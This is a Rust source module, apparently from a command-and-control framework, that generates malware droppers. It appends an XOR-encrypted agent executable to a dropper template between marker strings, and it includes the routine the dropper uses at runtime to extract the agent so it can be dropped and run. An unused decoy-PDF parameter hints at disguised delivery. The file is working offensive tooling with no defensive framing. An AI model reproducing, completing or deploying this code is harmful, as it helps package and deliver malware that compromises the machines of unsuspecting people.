//! Standalone Dropper Generator
//!
//! This module generates droppers by embedding an encrypted agent executable
//! into a dropper template binary. No source code compilation required.
//!
//! The approach works by:
//! 1. Reading a pre-compiled dropper template
//! 2. Appending the encrypted agent payload to the end
//! 3. Updating PE headers to point to the payload
//!
//! This is simpler than binary patching and works reliably.

use std::fs;
use std::io::Read;
use std::path::Path;

/// Magic marker for payload data in the dropper
const PAYLOAD_MARKER: &[u8] = b"C2R2_PAYLOAD_DATA_START_MARKER__";
/// Magic marker to end payload section
const PAYLOAD_END_MARKER: &[u8] = b"C2R2_PAYLOAD_DATA_END_MARKER____";

/// Generate a standalone dropper by embedding encrypted agent
/// This creates a self-extracting executable that drops and runs the agent
pub fn generate_standalone_dropper(
    template_data: &[u8],
    encrypted_agent: &[u8],
    xor_key: &[u8],
    _decoy_pdf: Option<&std::path::PathBuf>,
) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    // Create a self-contained dropper by appending payload to PE
    // The dropper will read its own executable and extract the payload from the end

    // Format of appended data:
    // [original exe] [PAYLOAD_MARKER (32)] [xor_key_len (4)] [xor_key] [agent_len (4)] [encrypted_agent] [PAYLOAD_END_MARKER (32)]

    let mut output = template_data.to_vec();

    // Append payload marker
    output.extend_from_slice(PAYLOAD_MARKER);

    // Append XOR key length and key
    let key_len = xor_key.len() as u32;
    output.extend_from_slice(&key_len.to_le_bytes());
    output.extend_from_slice(xor_key);

    // Append encrypted agent length and data
    let agent_len = encrypted_agent.len() as u32;
    output.extend_from_slice(&agent_len.to_le_bytes());
    output.extend_from_slice(encrypted_agent);

    // Append end marker
    output.extend_from_slice(PAYLOAD_END_MARKER);

    println!("📦 Payload appended to dropper:");
    println!("   - XOR key: {} bytes", xor_key.len());
    println!("   - Encrypted agent: {} bytes", encrypted_agent.len());
    println!("   - Total dropper size: {} bytes", output.len());

    Ok(output)
}

/// Extract payload from a dropper executable
/// This is used by the dropper at runtime to extract the embedded agent
#[allow(dead_code)]
pub fn extract_payload_from_exe(
    exe_path: &Path,
) -> Result<(Vec<u8>, Vec<u8>), Box<dyn std::error::Error>> {
    let mut file = fs::File::open(exe_path)?;
    let mut data = Vec::new();
    file.read_to_end(&mut data)?;

    // Find payload marker
    let marker_pos = data
        .windows(PAYLOAD_MARKER.len())
        .position(|window| window == PAYLOAD_MARKER);

    let start_pos = match marker_pos {
        Some(pos) => pos + PAYLOAD_MARKER.len(),
        None => return Err("Payload marker not found".into()),
    };

    // Read XOR key length
    if start_pos + 4 > data.len() {
        return Err("Invalid payload format".into());
    }
    let key_len = u32::from_le_bytes([
        data[start_pos],
        data[start_pos + 1],
        data[start_pos + 2],
        data[start_pos + 3],
    ]) as usize;

    // Read XOR key
    let key_start = start_pos + 4;
    if key_start + key_len > data.len() {
        return Err("Invalid XOR key length".into());
    }
    let xor_key = data[key_start..key_start + key_len].to_vec();

    // Read agent length
    let agent_len_start = key_start + key_len;
    if agent_len_start + 4 > data.len() {
        return Err("Invalid payload format".into());
    }
    let agent_len = u32::from_le_bytes([
        data[agent_len_start],
        data[agent_len_start + 1],
        data[agent_len_start + 2],
        data[agent_len_start + 3],
    ]) as usize;

    // Read encrypted agent
    let agent_start = agent_len_start + 4;
    if agent_start + agent_len > data.len() {
        return Err("Invalid agent length".into());
    }
    let encrypted_agent = data[agent_start..agent_start + agent_len].to_vec();

    Ok((xor_key, encrypted_agent))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_payload_generation() {
        let template = b"MZ_FAKE_EXE_HEADER_DATA";
        let agent = b"AGENT_EXECUTABLE_DATA";
        let key = b"0123456789ABCDEF0123456789ABCDEF";

        let result = generate_standalone_dropper(template, agent, key, None);
        assert!(result.is_ok());

        let dropper = result.unwrap();
        assert!(dropper.starts_with(template));
        assert!(dropper.len() > template.len());
    }
}
